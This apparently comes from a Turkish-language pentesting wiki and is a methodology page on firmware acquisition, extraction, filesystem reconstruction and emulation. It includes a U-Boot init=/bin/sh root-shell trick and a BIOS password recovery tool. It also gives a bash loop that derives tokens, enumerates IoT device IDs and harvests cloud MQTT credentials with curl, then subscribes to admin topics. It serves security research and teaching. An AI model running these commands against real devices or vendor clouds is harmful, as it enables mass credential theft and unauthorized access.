# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Giriş**

### İlgili kaynaklar

Açığa açık donanım arayüzlerinden edinim için [UART konsoluyla desteklenen firmware dökümü](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) ve [SPI flash dökümü](../hardware-hacking/spi.md#dumping-firmware-from-eeproms) bölümlerine bakın. Konsola erişmeden önce tekrarlanabilir bir açılış zamanı UART yakalaması için [SCPI kontrollü güç ve osiloskop edinimi](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi) bölümüne bakın.

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, donanım bileşenleri ile kullanıcıların etkileşim kurduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte saklanır; böylece cihaz, açıldığı andan itibaren önemli talimatlara erişebilir ve işletim sisteminin başlatılmasını sağlar. Güvenlik açıklarını belirlemede firmware’i incelemek ve olası değişiklikler yapmak kritik bir adımdır.<sup>[[2]](#references)[[3]](#references)</sup>

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamanın kritik bir ilk adımıdır. Bu süreçte aşağıdakiler hakkında veri toplanır:

- CPU mimarisi ve çalıştırdığı işletim sistemi
- Bootloader özellikleri
- Donanım düzeni ve veri sayfaları
- Kod tabanı metrikleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişleri ve mevzuat sertifikaları
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve belirlenen güvenlik açıkları

Bu amaçla **open-source intelligence (OSINT)** araçları büyük önem taşır. Mevcut açık kaynaklı yazılım bileşenlerini manuel ve otomatik inceleme süreçleriyle analiz etmek de aynı şekilde değerlidir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, olası sorunları bulmak için kullanılabilecek ücretsiz statik analiz olanağı sunar.

## **Firmware’i Edinme**

Firmware çeşitli yollarla edinilebilir; her yöntemin karmaşıklık seviyesi farklıdır:

- Kaynağından **doğrudan** (geliştiricilerden, üreticilerden)
- Sağlanan talimatları izleyerek **derleme**
- Resmî destek sitelerinden **indirme**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularından yararlanma
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage**’a doğrudan erişme
- Man-in-the-middle teknikleriyle **güncellemeleri** yakalama
- **UART**, **JTAG** veya **PICit** gibi bağlantılar üzerinden cihazdan **çıkarma**
- Cihaz iletişimi sırasında güncelleme isteklerini **sniffing** ile yakalama
- **Hardcoded güncelleme uç noktalarını** belirleme ve kullanma
- Bootloader’dan veya ağdan **döküm alma**
- Diğer tüm yöntemler başarısız olursa, uygun donanım araçlarını kullanarak depolama çipini **çıkarma ve okuma**

### Yalnızca UART logları: flash’teki U-Boot env üzerinden root shell’i zorlama

UART RX yok sayılıyorsa (yalnızca loglar varsa), U-Boot ortam blob’unu çevrimdışı **düzenleyerek** yine de bir init shell’i zorlayabilirsiniz:<sup>[[6]](#references)</sup>

1. SOIC-8 klipsi ve programlayıcıyla SPI flash’i dökün (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env bölümünü bulun, `bootargs` değerini `init=/bin/sh` içerecek şekilde düzenleyin ve blob için **U-Boot env CRC32 değerini yeniden hesaplayın**.
3. Yalnızca env bölümünü yeniden flash'leyin ve yeniden başlatın; UART üzerinden bir shell açılmalıdır.

Bu yöntem, bootloader shell'inin devre dışı olduğu ancak env bölümüne harici flash erişimiyle yazılabildiği gömülü cihazlarda kullanışlıdır.

## Firmware'i analiz etme

Artık **firmware'e sahip olduğunuza göre**, nasıl işlem yapacağınızı belirlemek için içinden bilgi çıkarmanız gerekir. Bunun için kullanabileceğiniz farklı araçlar:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Bu araçlarla pek bir şey bulamazsan `binwalk -E <bin>` ile imajın **entropy** değerini kontrol et. Entropy düşükse muhtemelen şifrelenmemiştir. Entropy yüksekse muhtemelen şifrelenmiştir (ya da bir şekilde sıkıştırılmıştır).

Ayrıca, **firmware içine gömülü dosyaları** çıkarmak için şu araçları kullanabilirsin:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) da kullanabilirsin.

### Differential flash analysis ve kurtarılabilir XOR secret store'ları

Bir firmware ayarının belgelenmiş bir depolama biçimi yoksa önce eşleşen birkaç flash okuması al, **tam olarak bir** ayarı değiştir, ardından tüm yonganın dökümünü yeniden al ve offset'leri karşılaştır. Deneyi kontrollü değerlerle tekrarlamak, ayara ait değişiklikleri sayaçlardan ve yazma metadatasından ayırt etmeyi sağlar; değişikliklerin yerinde değil de yeni offset'lerde görülmesi, yalnızca sona eklenen veya log yapılı bir depolamaya işaret eder. Silinmiş/tombstone olarak işaretlenmiş girdileri koru; yük baytları hâlâ kurtarılabilir olabilir.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Bölgeyi bulduktan sonra `binwalk` gibi araçlarla firmware modüllerini çıkarın ve Ghidra'da yazıcıyı/doğrulayıcıyı tersine mühendislikle inceleyin. Alan sınırlarını, padding'i, key indekslemesini ve key türetme yöntemini yalnızca ciphertext örüntülerinden çıkarsamak yerine kod üzerinden doğrulayın.<sup>[[12]](#references)</sup>

#### Şifrelenmiş sıfır padding'den key kurtarma

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) bölümünde açıklandığı gibi, bilinen açık metin aynı offset'lerdeki keystream baytlarını ortaya çıkarır. Sabit boyutlu bir alan, sıfır padding'i tekrarlanan bir XOR key'inin tüm indekslerini kapsadığında özellikle savunmasızdır: `0x00 XOR key_byte = key_byte` olduğundan, şifrelenmiş padding bu key baytlarını doğrudan açığa çıkarır. Tüm key indeksleri kapsanıyorsa key'i ciphertext'in son kısmından yeniden oluşturun ve dolu baytların şifresini çözün.<sup>[[12]](#references)</sup>

Dell'in savunmasız DVAR BIOS parola biçimi, somut bir örnektir: 32 baytlık bir alanın `0` numaralı baytı düz metindir; `1..31` numaralı baytlar ise tekrarlanan 20 baytlık bir key kullanır.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Parola uzunluğu `L` olduğunda, XOR işleminden önce `L..31` konumları sıfırdı. `L <= 12` olduğunda bu konumlar tüm anahtar indekslerini kapsar; böylece brute force gerekmeden anahtarın tamamı ve parola kurtarılır:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Geçmiş kayıtlardan anahtarları çıkarın

Her kaydı bağımsız olarak analiz etmeyin. DVAR anahtarı yaklaşık olarak `modified_md5(device_seed || variable_GUID || password[0])` şeklinde türetilir: device seed ve GUID sabittir, parolaya bağlı tek girdi ise açık metindeki ilk bayttır. Bu, cihaz başına en fazla 256 anahtar olduğu ve aynı baytla başlayan kayıtların aynı anahtarı paylaştığı anlamına gelir. Etkin ve silinmiş kayıtları bu bayta göre gruplayın; kısa bir geçmiş kayıt, padding üzerinden anahtarın tamamını leak edebilir ve kendi padding'i yetersiz olan güncel, daha uzun bir kaydın şifresini çözebilir. Bu nedenle, parola rotasyonu sırasında eski şifreli metnin silinmek yerine tombstone olarak işaretlenmesi maruziyeti artırabilir.<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) aracı DVAR'ı bulur, aday kayıtları doğrular, parolaları kurtarır ve ham saklanan/anahtar baytlarını görüntüleyebilir. Aracı bir checkout üzerinden derleyin ve doğrulanmış bir flash imajını aşağıdaki gibi tarayın:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Özel parser'larda yanlış pozitifleri kayıt yapısı, yazdırılabilir karakter kısıtlamaları, sıfır dolgusu kontrolleri, anahtar entropisi ve anahtarın döngü yaptığı yerlerdeki tutarlılıkla eleyin. Tekrarlanan dump'larda yazma başına seyrek bit değişimleri görülüyorsa, gözlemlenen maskeleri listeleyin ve bu kısıtlamalara göre düzeltmeleri sıralayın; ancak sezgisel çıktıyı kesin kurtarma sonucu olarak sunmak yerine belirsiz karakterleri bildirin.<sup>[[12]](#references)</sup>

Password verifier'lar, geri çözülebilir ciphertext yerine salt eklenmiş, yinelenen tek yönlü hash saklamalıdır; log-structured depolar ise eskiyen gizli verileri güvenli biçimde kaldırmalıdır.<sup>[[12]](#references)</sup>

### Dosya Sistemini Alma

Önceki yorumlarda belirtilen `binwalk -ev <bin>` gibi araçlarla **dosya sistemini çıkarmış** olmanız gerekir.\
Binwalk genellikle dosya sistemini **dosya sistemi türünün adını taşıyan bir klasöre** çıkarır. Bu türler genellikle şunlardan biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dosya Sistemini Elle Çıkarma

Bazen binwalk, imza listesinde **dosya sisteminin magic byte'ını bulundurmaz**. Bu durumlarda, dosya sisteminin offset'ini bulmak ve sıkıştırılmış dosya sistemini binary'den ayıklamak için binwalk'ı kullanın; ardından aşağıdaki adımları izleyerek dosya sistemini türüne göre **elle çıkarın**.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs dosya sistemini carve etmek için aşağıdaki **dd komutunu** çalıştırın.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatif olarak aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanılmıştır)

`$ unsquashfs dir.squashfs`

İşlem tamamlandığında dosyalar "`squashfs-root`" dizininde bulunur.

- CPIO arşiv dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash içeren ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Bölünmüş gömülü root dosya sistemlerini yeniden oluşturma

Ham bir eMMC/SSD dökümü geçerli bir dosya sistemi başlığı içeriyor, ancak meta veri ofsetleri nominal bölümün dışına taşıyorsa, dosya sistemini hemen bozuk olarak sınıflandırmayın. Gömülü önyükleme kodu, Device Mapper ile birden fazla fiziksel aralıktan gerçek root aygıtını oluşturabilir; bu nedenle tek bir GPT bölümünü carve etmek yalnızca ilk segmenti verir.<sup>[[9]](#references)</sup>

#### Tüm medya imajını inceleme

Öncelikle edinimin tamamlandığını, boyutun sabit kaldığını ve imajı hâlâ hiçbir yazma işleminin kullanmadığını doğrulayın. Dosya adı bir başlangıç/bitiş adresi içeriyorsa bu aralığı gerçek bayt sayısıyla karşılaştırın. GPT'yi salt okunur modda kurtarın ve yalnızca gereken aralığı bağlayın; iş istasyonunda güvenilmeyen bir fiziksel birime karşı `vgchange -ay` komutunu **çalıştırmayın**; çünkü birim grubu çakışmaları ve istenmeyen yazma işlemleri meydana gelebilir.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Özgün init mantığının veya bir LVM yığınının tüm imajı görmesi gerekiyorsa geçici bir VM kullanın. Standart bir boot bölümündeki geçmiş boot günlükleri özellikle yararlıdır: bootloader; tescilli kapsayıcı ofsetlerini, bileşen uzunluklarını, slot seçimini, hizalama kurallarını ve imza doğrulamasını günlüğe kaydetmiş olabilir. Gömülü komut satırını/kernel/initramfs'i ayıklamak için bu değerleri kullanın, ardından her çıktıyı `file`, magic byte'lar ve `binwalk` ile bağımsız olarak doğrulayın; kapsayıcının sonuna kadar okumak kernel'e yanlışlıkla bir initrd, ACPI nesnesi veya imza ekleyebilir.<sup>[[9]](#references)</sup>

#### Boot sırasındaki blok eşlemesini kurtarın

Kernel'in initramfs'ini çıkarın ve `/init` ile depolama kitaplıklarını tersine mühendislikle inceleyin. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) bölümünde `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` ve bölüm yollarına yönelik string referanslarını takip edin; ardından etkin A/B slotunu seçen ve tabloyu oluşturan kodun izini sürün. Radare2 için yararlı başlangıç noktaları: `r2 -A init`, `afl`, `pdf @ main` ve `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Linear target, bir sanal aygıtın ardışık aralıklarını bir veya daha fazla arka uç aygıtındaki aralıklara eşler. Kurtarılan iki segmentli bir tablo genellikle şu biçimdedir (tüm konumlar ve uzunluklar 512 baytlık sektörler cinsindendir):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Makine kodu aritmetiğini; tamsayı genişliği, kaydırmalar ve birim dönüşümleri dâhil, aynen yeniden üretin. Örneğin aşağıdaki ifade, bayt boyutunu önce 4-KiB sınırına aşağı yuvarlar ve ancak bundan sonra 512 baytlık sektörlere dönüştürür; bunu `p4_bytes // 512` ile değiştirmek, bölüm sayfa hizalı olmadığında seçilen kuyruğu `p4_bytes % 4096` kadar kaydırır.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Tablodaki aralıkları, medya dökümünün tamamını belleğe yüklemek yerine sınırlı boyutlu parçalar halinde tablo sırasına göre kopyalayarak düz bir analiz imajı oluşturun. Böylece host tarafında mapper aygıtları oluşturulmasını da önlersiniz. GPT'den elde edilen offset'leri, ters çevrilmiş sektör sayılarını ve ortaya çıkan çıktı uzunluğunu ayrı ayrı doğrulayın.<sup>[[9]](#references)</sup>

#### Bozulmayı sabit bir yeniden oluşturma hatasından ayırt etme

SquashFS için `unsquashfs` çalıştırmadan önce `hsqs` magic değerini kontrol edin ve superblock'taki 40. offset'te bulunan little-endian 64 bit `bytes_used` alanını çözümleyin. Birbirinden bağımsız birkaç yapıda çıkarma başarısız olursa, beklenen konumların çevresindeki geniş bir aralığı tarayın ve güçlü yapısal adaylar arayın: açılabilen bir metadata bloğu, art arda gelen birkaç geçerli dizin girdisi, makul inode alanları, inode sayısıyla tutarlı bir root inode veya geçerli bir integrity-metadata yapısı. Tek bir magic eşleşmesi yeterli değildir.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Aynı imzalı delta, dizin metaverisi ve verity kaydı gibi bağımsız yapıları geçerli kılıyorsa, olası neden eksik baytlar değil, sistematik bir segment başlangıcı hatasıdır. Yetim kurtarma veya dosya sistemi metaverisini yamalama girişiminde bulunmadan önce tersine çevrilmiş aritmetiğe dönün ve atılan kalanları, işaretliliği, taşmayı veya sektör/sayfa yuvarlamasını inceleyin.<sup>[[9]](#references)</sup>

Son olarak, koruma sınırlarını ayrı tutun: TPM ile mühürlenmiş LUKS birimleri veri gizliliğini korurken, imzalı dm-verity eşlemesi kök dosya sistemi bütünlüğünü korur. Yazılımsal bir TPM, orijinal fiziksel TPM’ye mühürlenmiş bir anahtarı kurtaramaz; verity doğrulamasını atlayan yalnızca araştırma amaçlı bir init üzerinden değiştirilmiş SquashFS’yi başlatmak da imzasını taklit etmez veya dm-verity’yi bozmaz.<sup>[[9]](#references)</sup>

## Firmware'i Analiz Etme

Firmware elde edildikten sonra, yapısını ve olası güvenlik açıklarını anlamak için onu incelemek önemlidir. Bu süreç, firmware görüntüsünü analiz etmek ve değerli verileri çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

İkili dosyayı (bundan böyle `<bin>` olarak anılacaktır) ilk inceleme için bir dizi komut sunulmuştur. Bu komutlar dosya türlerini belirlemeye, dizeleri çıkarmaya, ikili verileri analiz etmeye ve bölüm ile dosya sistemi ayrıntılarını anlamaya yardımcı olur:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Görüntünün şifreleme durumunu değerlendirmek için `binwalk -E <bin>` ile **entropi** kontrol edilir. Düşük entropi şifreleme olmadığını, yüksek entropi ise olası şifreleme veya sıkıştırmayı gösterir.

**Gömülü dosyaları** çıkarmak için **file-data-carving-recovery-tools** dokümantasyonu ve dosyaları incelemeye yönelik **binvis.io** gibi araçlar ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` kullanılarak dosya sistemi genellikle çıkarılabilir; çoğunlukla dosya sistemi türünün adını taşıyan bir dizine (ör. squashfs, ubifs) çıkarılır. Ancak **binwalk**, magic byte'lar eksik olduğu için dosya sistemi türünü tanıyamadığında manuel çıkarma gerekir. Bunun için `binwalk` ile dosya sisteminin offset'i bulunur, ardından dosya sistemini ayıklamak için `dd` komutu kullanılır:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daha sonra, dosya sistemi türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içerikleri manuel şekilde çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra güvenlik açıkları aranmaya başlanır. Güvenli olmayan ağ daemon'ları, sabit kodlanmış kimlik bilgileri, API uç noktaları, güncelleme sunucusu işlevleri, derlenmemiş kodlar, başlangıç betikleri ve çevrimdışı analiz için derlenmiş ikili dosyalar incelenir.

İncelenmesi gereken **önemli konumlar** ve **öğeler** şunlardır:

- Kullanıcı kimlik bilgileri için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL sertifikaları ve anahtarları
- Olası güvenlik açıkları için yapılandırma ve betik dosyaları
- Daha ayrıntılı analiz için gömülü ikili dosyalar
- Yaygın IoT cihazı web sunucuları ve ikili dosyaları

Dosya sistemindeki hassas bilgileri ve güvenlik açıklarını ortaya çıkarmaya çeşitli araçlar yardımcı olur:

- Hassas bilgi araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analizi için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Statik ve dinamik analiz için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Derlenmiş İkili Dosyalarda Güvenlik Kontrolleri

Dosya sisteminde bulunan hem kaynak kodlar hem de derlenmiş ikili dosyalar güvenlik açıklarına karşı incelenmelidir. Unix ikili dosyaları için **checksec.sh**, Windows ikili dosyaları içinse **PESecurity** gibi araçlar, istismar edilebilecek korumasız ikili dosyaları belirlemeye yardımcı olur.

## Türetilmiş URL belirteçleri aracılığıyla cloud yapılandırmasını ve MQTT kimlik bilgilerini elde etme

Birçok IoT hub'ı, cihaza özel yapılandırmasını aşağıdaki gibi görünen bir cloud uç noktasından alır:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analizi sırasında `<token>` değerinin, örneğin aşağıdaki gibi, sabit kodlanmış bir secret kullanılarak device ID'den yerel olarak türetildiğini görebilirsiniz:

- token = MD5( deviceId || STATIC_KEY ) ve büyük harfli hex olarak gösterilir

Bu tasarım, deviceId ve STATIC_KEY değerlerini öğrenen herkesin URL'yi yeniden oluşturup cloud yapılandırmasını almasına olanak tanır. Bu yapılandırma çoğu zaman açık metin MQTT kimlik bilgilerini ve topic öneklerini açığa çıkarır.

Uygulamalı iş akışı:

1) UART açılış günlüklerinden deviceId değerini çıkarın

- 3.3V UART adaptörü (TX/RX/GND) bağlayıp günlükleri yakalayın:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Örneğin, bulut yapılandırma URL kalıbını ve broker adresini yazdıran satırları arayın:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Firmware'den STATIC_KEY'i ve token algoritmasını çıkarma

- Binary'leri Ghidra/radare2'ye yükleyin ve config yolunu ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash'te türetin ve digest'i büyük harfe dönüştürün:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud yapılandırmasını ve MQTT kimlik bilgilerini toplayın

- URL'yi oluşturup curl ile JSON'u çekin; sırları çıkarmak için jq ile ayrıştırın:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Düz metin MQTT'yi ve zayıf topic ACL'lerini kötüye kullanın (varsa)

- Kurtarılan kimlik bilgilerini kullanarak bakım topic'lerine abone olun ve hassas olayları arayın:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Tahmin edilebilir cihaz kimliklerini listeleyin (ölçekli olarak, yetkiyle)

- Birçok ekosistemde, satıcı OUI/ürün/tür baytlarının ardından sıralı bir sonek bulunur.
- Aday kimlikleri yineleyebilir, token'lar türetebilir ve yapılandırmaları programatik olarak alabilirsiniz:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notlar
- Toplu enumeration girişiminde bulunmadan önce daima açık yetki alın.
- Mümkün olduğunda, hedef donanımı değiştirmeden sırları elde etmek için emülasyonu veya statik analizi tercih edin.


Firmware'i emüle etme süreci, bir cihazın çalışmasının veya tek bir programın **dinamik analizini** sağlar. Bu yaklaşım, donanım veya mimari bağımlılıkları nedeniyle zorluklarla karşılaşabilir; ancak root filesystem'i veya belirli binary dosyalarını Raspberry Pi gibi mimarisi ve endianness'i eşleşen bir cihaza ya da önceden oluşturulmuş bir sanal makineye aktarmak, daha ileri testleri kolaylaştırabilir.

### Tekil Binary Dosyalarını Emüle Etme

Tek bir programı incelerken programın endianness'ini ve CPU mimarisini belirlemek çok önemlidir.

#### MIPS Mimarisi Örneği

MIPS mimarisine ait bir binary dosyasını emüle etmek için şu komut kullanılabilir:

```bash
file ./squashfs-root/bin/busybox
```

Ve gerekli emülasyon araçlarını yüklemek için:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

For MIPS (big-endian) için `qemu-mips` kullanılır; little-endian binary'ler için `qemu-mipsel` tercih edilir.

#### ARM Architecture Emulation

ARM binary'leri için süreç benzerdir; emülasyonda `qemu-arm` emülatörü kullanılır.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve benzeri araçlar, tam firmware emülasyonunu kolaylaştırır, süreci otomatikleştirir ve dinamik analize yardımcı olur.

### Emulation için bölünmüş ve doğrulanmış root dosya sistemlerini yeniden oluşturma

SquashFS superblock okunabiliyor ancak inode, dizin veya fragment table offset'leri olanaksız görünüyorsa, hemen `unsquashfs` üzerinde yama yapmayın. Erken önyükleme binary'sini tersine mühendislikle inceleyin ve oluşturduğu block-device grafiğini yeniden oluşturun: gömülü sistemlerde nominal bir root partition bulunabilir, ancak gerçek dosya sistemi başka bir partition'dan alınan sektörleri ekleyen bir `dm-linear` eşlemesiyle oluşturulabilir. Yalnızca superblock'u kontrol etmek başarılı olabilir; ancak sonraki tüm metadata blokları kaymış olabilir.<sup>[[11]](#references)</sup>

Firmware'deki aritmetiği aynen koruyun. Özellikle uzunlukların byte, 512-byte sektör veya 4 KiB page cinsinden olup olmadığını belirleyin; shift ve truncation işlemlerini özgün sıralarıyla yeniden uygulayın ve A/B düzenlerindeki bankaya bağlı kuyruk bölgelerini hesaba katın. Örneğin, `(partition_bytes >> 12) << 3` önce 4 KiB sınırına göre truncation yapar, sonra sonucu 512-byte sektör cinsinden ifade eder; bunu `partition_bytes // 512` ile değiştirmek, eklenen extent'in konumunu birkaç kilobyte kaydırabilir ve sonraki tüm SquashFS tablolarını bozabilir.<sup>[[11]](#references)</sup>

Yararlı bir doğrulama iş akışı:<sup>[[11]](#references)</sup>

1. Her `dm-linear` segmentinin kaynak aygıtını, başlangıç sektörünü ve uzunluğunu verifier/init binary'sinden belirleyin.
2. Hizalama semantiğini değiştirmeden extent'leri birleştirin veya eşleyin.
3. Çıkarma hâlâ başarısız olursa, tahmin edilen sınır çevresinde yalnızca küçük bir aralıkta arama yapın ve tek başına makul görünen bir superblock'u kabul etmek yerine art arda gelen birkaç geçerli metadata yapısını şart koşun.
4. Yeniden oluşturulan imajı değiştirilmemiş `unsquashfs` ile çalıştırın; tüm dizinlerin ve fragment'lerin başarıyla taranması, `unsquashfs -stat` çıktısından daha güçlü bir kanıttır.

#### Analyst-controlled dm-verity replacement

Analist QEMU kernel'ini, initramfs'i ve sanal diskleri kontrol ediyorsa, vendor'ın verification PID 1 sürecini küçük, statik olarak bağlı bir init ile değiştirerek değiştirilmiş bir root önyüklenebilir. Bu, **lab boot-chain substitution** yöntemidir; dm-verity'nin, RSA imzasının, Secure Boot'un veya TPM-sealed bir anahtarın kırılması değildir.<sup>[[11]](#references)</sup>

Yeni init, özgün önyükleme yolunun işlevsel adımlarını taklit etmelidir: `devtmpfs` bağlamalı, `setsid()` çağırmalı, `/dev/console`'ı 0–2 dosya tanımlayıcılarına bağlamalı, `/proc` ve `/sys` bağlamalı, sağlanan block device'ın kullanılabilir olmasını beklemeli, düzenlenmiş root'u salt okunur bağlamalı, eski root pseudo-filesystem'lerini ayırmalı, yeni mount'u `/` üzerine taşımalı, `chroot` yapmalı ve firmware'in özgün `/sbin/init` dosyasını `execve()` ile çalıştırmalıdır. `MS_MOVE` işleminden **önce** `/dev`, `/proc` ve `/sys` mount'larını ayırmak, yeni root'a ait mount point'lerin yanlışlıkla ayrılmasını önler.<sup>[[11]](#references)</sup>

Değiştirilebilir aygıt durumunu, değiştirilmiş immutable root'tan ayrı tutun. Bir qcow2 overlay, özgün diskin LVM durumunu korurken ikinci bir salt okunur virtio disk düzenlenmiş SquashFS'i sağlayabilir:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Çevrimdışı image-state debugging

